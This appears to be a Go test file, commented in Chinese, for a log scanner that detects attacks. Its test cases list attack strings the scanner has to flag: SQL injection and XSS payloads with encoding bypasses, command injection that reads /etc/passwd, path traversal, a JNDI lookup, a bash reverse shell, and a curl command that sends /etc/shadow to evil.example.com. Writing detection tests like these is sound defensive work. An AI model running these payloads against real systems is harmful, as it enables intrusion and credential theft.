package logscan

import "testing"

// TestBypassVariants 各种编码/混淆写法都要认出来（正样本）。
func TestBypassVariants(t *testing.T) {
	cases := []struct {
		name string
		line string
		want string
	}{
		{"SQLi 原始", `1' UNION SELECT 1,2,3--`, "WEB-SQLI"},
		{"SQLi 注释分割", `admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users`, "WEB-SQLI"},
		{"SQLi URL 编码", `1%27%20union%20all%20select%201`, "WEB-SQLI"},
		{"SQLi 双重编码", `1%2527%2520union%2520select%25201`, "WEB-SQLI"},
		{"SQLi 制表符分隔", "1 union%09select 1", "WEB-SQLI"},
		{"SQLi 大小写混淆", `1 UnIoN sElEcT 1`, "WEB-SQLI"},
		{"SQLi or 1=1", `admin' or 1=1--`, "WEB-SQLI"},
		{"SQLi 敏感表", `select username,password from users where id=1`, "WEB-SQLI"},
		{"XSS 原始", `<script>alert(1)</script>`, "WEB-XSS"},
		{"XSS URL 编码", `%3Cscript%3Ealert(1)%3C/script%3E`, "WEB-XSS"},
		{"XSS JS 转义", `\x3cscript\x3ealert(1)\x3c/script\x3e`, "WEB-XSS"},
		{"XSS HTML 实体", `&lt;script&gt;alert(1)&lt;/script&gt;`, "WEB-XSS"},
		{"RCE 原始", `;cat /etc/passwd`, "WEB-RCE"},
		{"RCE IFS 绕过", `;cat$IFS/etc/passwd`, "WEB-RCE"},
		{"RCE 空格编码", `;cat%20/etc/passwd`, "WEB-RCE"},
		{"RCE 命令替换", `$(id)`, "WEB-RCE"},
		{"穿越 原始", `../../../../etc/shadow`, "WEB-TRAVERSAL"},
		{"穿越 编码", `..%2f..%2f..%2fetc/passwd`, "WEB-TRAVERSAL"},
		{"WebShell 访问", `/uploads/x.php?cmd=id`, "WEB-WEBSHELL"},
		{"扫描器 UA", `sqlmap/1.7#stable`, "WEB-SCANNER"},
		{"JNDI 注入", `${jndi:ldap://evil.example.com/a}`, "LOG-JNDI"},
		{"敏感文件探测", `GET /.env HTTP/1.1`, "WEB-SENSITIVE"},
		{"认证爆破", `Failed password for root from 1.2.3.4 port 22 ssh2`, "AUTH-BRUTEFORCE"},
		{"挖矿外联", `stratum+tcp://pool.example.com:3333`, "SYS-MINING"},
		{"反弹 Shell", `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`, "RCE-REVSHELL"},
		{"数据外带", `curl --data @/etc/shadow http://evil.example.com/`, "RCE-REVSHELL"},
	}

	for _, c := range cases {
		got := Scan(c.line, "test.log", nil)
		found := false
		for _, h := range got.Hits {
			if h.RuleID == c.want {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("[%s] 未命中 %s：%s（命中=%v）", c.name, c.want, c.line, hitIDs(got))
		}
	}
}

// TestNormalTrafficNoFalsePositive 正常流量与正常文本不能误报（负样本）。
func TestNormalTrafficNoFalsePositive(t *testing.T) {
	negs := []string{
		`10.0.0.1 - - [10/Oct/2026:11:00:00 +0800] "GET /about.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0"`,
		`10.0.0.1 - - [10/Oct/2026:11:00:01 +0800] "GET /api/search?q=union+square+station HTTP/1.1" 200 512`,
		`10.0.0.1 - - [10/Oct/2026:11:00:02 +0800] "GET /blog/select-your-country-from-the-list HTTP/1.1" 200 512`,
		`10.0.0.1 - - [10/Oct/2026:11:00:03 +0800] "GET /static/app.js HTTP/1.1" 200 10240`,
		`10.0.0.1 - - [10/Oct/2026:11:00:04 +0800] "POST /api/orders HTTP/1.1" 201 128 "-" "Mozilla/5.0"`,
		`10.0.0.1 - - [10/Oct/2026:11:00:05 +0800] "GET /api/users?sort=created_at&order=desc HTTP/1.1" 200 4096`,
		`10.0.0.1 - - [10/Oct/2026:11:00:06 +0800] "GET /assets/logo.png HTTP/1.1" 200 8192`,
		`Oct 10 11:00:00 host systemd[1]: Started Session 12 of user root.`,
		`Oct 10 11:00:01 host sshd[1234]: Accepted publickey for deploy from 10.0.0.5 port 51000 ssh2`,
		`10.0.0.1 - - [10/Oct/2026:11:00:07 +0800] "GET /index.php?id=10 HTTP/1.1" 200 512`,
	}
	// 只跑 awdshell 内置规则：这一组必须零误报
	for _, line := range negs {
		got := Scan(line, "test.log", DefaultRules)
		if len(got.Hits) > 0 {
			t.Errorf("内置规则误报了正常行：%s -> %v", line, hitIDs(got))
		}
	}
}

// TestCommonSystemLogLinesNotFlagged 系统日志里最常见的几行不该被任何规则报出来。
// 规则库是从 WAF 搬来的（原本有 targets 作用域），在日志场景下全行匹配更容易误报，
// 这个测试守住底线：连这几行都报，说明规则库不能直接拿来扫日志。
func TestCommonSystemLogLinesNotFlagged(t *testing.T) {
	lines := []string{
		`Oct 10 11:00:00 host systemd[1]: Started Session 12 of user root.`,
		`Oct 10 11:00:01 host sshd[1234]: Accepted publickey for deploy from 10.0.0.5 port 51000 ssh2`,
		`Oct 10 11:00:02 host CRON[2001]: (root) CMD (/usr/bin/backup.sh)`,
		`Oct 10 11:00:03 host kernel: [12345.678] eth0: link up, 1000Mbps, full-duplex`,
		`Oct 10 11:00:04 host nginx: 10.0.0.1 - - "GET /health HTTP/1.1" 200 2`,
	}
	for _, line := range lines {
		got := Scan(line, "test.log", nil)
		for _, h := range got.Hits {
			// 只允许系统/认证类规则命中，Web 载荷类规则不该在普通系统日志行上触发
			switch h.Category {
			case "sqli", "xss", "rce", "traversal", "webshell", "scanner", "recon":
				t.Errorf("系统日志被 Web 类规则误报：%s -> %s(%s)", line, h.RuleID, h.Category)
			}
		}
	}
}

// TestDecodedFlag 解码后才命中的要标出来，原始就命中的不标。
func TestDecodedFlag(t *testing.T) {
	plain := Scan(`1' UNION SELECT 1`, "t", nil)
	if len(plain.Hits) == 0 || plain.Hits[0].Decoded {
		t.Errorf("原始命中不应标记 Decoded：%+v", plain.Hits)
	}
	// $IFS 这种写法原文匹配不到，必须归一化之后才能命中 -> 应当标记 Decoded
	encoded := Scan("GET /cgi?x=;cat$IFS/etc/passwd HTTP/1.1", "t", nil)
	found := false
	for _, h := range encoded.Hits {
		if h.RuleID == "WEB-RCE" {
			found = true
			if !h.Decoded {
				t.Errorf("归一化后才命中应标记 Decoded：%+v", h)
			}
		}
	}
	if !found {
		t.Errorf("IFS 绕过未命中：%v", hitIDs(encoded))
	}
	if encoded.DecodedHits == 0 {
		t.Error("DecodedHits 统计为 0")
	}
}

// TestNormalizeNeverPanics 归一化对垃圾输入也不许 panic。
func TestNormalizeNeverPanics(t *testing.T) {
	inputs := []string{
		"", "%", "%zz", "%2", "&amp", `\x`, `\u12`, "$IFS", "${IFS}", "/*", "*/", "\x00\x01",
		"%%2525", strings100k(),
	}
	for _, in := range inputs {
		out, _ := Normalize(in)
		_ = out
	}
}

func strings100k() string {
	b := make([]byte, 100000)
	for i := range b {
		b[i] = byte('a' + i%26)
	}
	return string(b)
}

func hitIDs(r Result) []string {
	ids := make([]string, 0, len(r.Hits))
	for _, h := range r.Hits {
		ids = append(ids, h.RuleID)
	}
	return ids
}
